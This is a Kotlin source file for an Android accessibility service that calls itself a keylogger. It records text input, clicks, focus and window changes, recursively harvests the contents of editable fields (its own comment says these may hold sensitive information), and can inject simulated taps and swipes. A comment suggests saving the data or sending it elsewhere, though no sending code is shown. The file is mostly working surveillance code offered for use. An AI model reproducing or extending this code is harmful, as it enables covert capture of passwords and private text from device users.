package com.anti.rootadbcontroller.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

/**
 * An accessibility service that acts as a keylogger, capturing user interactions
 * such as text input, view clicks, and focus changes. It also provides methods
 * for simulating user gestures like taps and swipes. This service requires the
 * accessibility permission to be granted by the user.
 */
class KeyloggerAccessibilityService : AccessibilityService() {

    private val keylogData = mutableListOf<String>()

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val eventText = when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "Text Changed: ${event.text}"
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> "Focused: ${event.className} - ${event.text}"
            AccessibilityEvent.TYPE_VIEW_CLICKED -> "Clicked: ${event.className} - ${event.text}"
            AccessibilityEvent.TYPE_VIEW_SELECTED -> "Selected: ${event.className} - ${event.text}"
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> "Text Selection: ${event.text}"
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> "Window Changed: ${event.className}"
            else -> ""
        }

        if (eventText.isNotEmpty()) {
            Log.d(TAG, eventText)
            keylogData.add(eventText)
            // In a real application, you might want to save this data or send it somewhere
        }

        // Extract information from the accessibility node tree
        rootInActiveWindow?.let {
            extractNodeInfo(it)
            it.recycle()
        }
    }

    private fun extractNodeInfo(nodeInfo: AccessibilityNodeInfo) {
        // Check if this node has editable text that might contain sensitive information
        if (nodeInfo.text != null && nodeInfo.isEditable) {
            val capturedText = "Captured from ${nodeInfo.className}: ${nodeInfo.text}"
            Log.d(TAG, capturedText)
            keylogData.add(capturedText)
        }

        // Recursively process child nodes
        for (i in 0 until nodeInfo.childCount) {
            nodeInfo.getChild(i)?.let {
                extractNodeInfo(it)
                it.recycle()
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Keylogger service interrupted")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Keylogger service connected")
    }

    /**
     * Simulates a tap gesture at the specified screen coordinates.
     * @param x The x-coordinate of the tap.
     * @param y The y-coordinate of the tap.
     */
    fun simulateTap(x: Float, y: Float) {
        val path = Path().apply {
            moveTo(x, y)
        }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
            .build()
        dispatchGesture(gesture, null, null)
    }

    /**
     * Simulates a swipe gesture between two points.
     * @param startX The starting x-coordinate.
     * @param startY The starting y-coordinate.
     * @param endX The ending x-coordinate.
     * @param endY The ending y-coordinate.
     * @param duration The duration of the swipe in milliseconds.
     */
    fun simulateSwipe(startX: Float, startY: Float, endX: Float, endY: Float, duration: Long) {
        val path = Path().apply {
            moveTo(startX, startY)
            lineTo(endX, endY)
        }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, duration))
            .build()
        dispatchGesture(gesture, null, null)
    }

    companion object {
        private const val TAG = "KeyloggerService"
    }
}

